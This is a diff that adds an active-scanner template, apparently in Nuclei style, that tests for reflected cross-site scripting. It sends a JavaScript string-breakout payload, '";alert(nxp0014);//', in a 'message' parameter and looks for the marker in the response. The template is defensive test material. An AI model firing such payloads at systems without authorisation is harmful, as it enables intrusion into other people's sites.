@@ -1,0 +1,20 @@
+id: patt-xss-js-str-01-message
+name: 'PATT xss patt-xss-js-str-01 via message'
+severity: high
+type: active
+tags:
+  - xss
+  - patt
+  - filterquote
+description: 'PATT breakout JS string double-quote. [patt:patt-xss-js-str-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/README.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      message:
+        - '";alert(nxp0014);//'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'nxp0014'
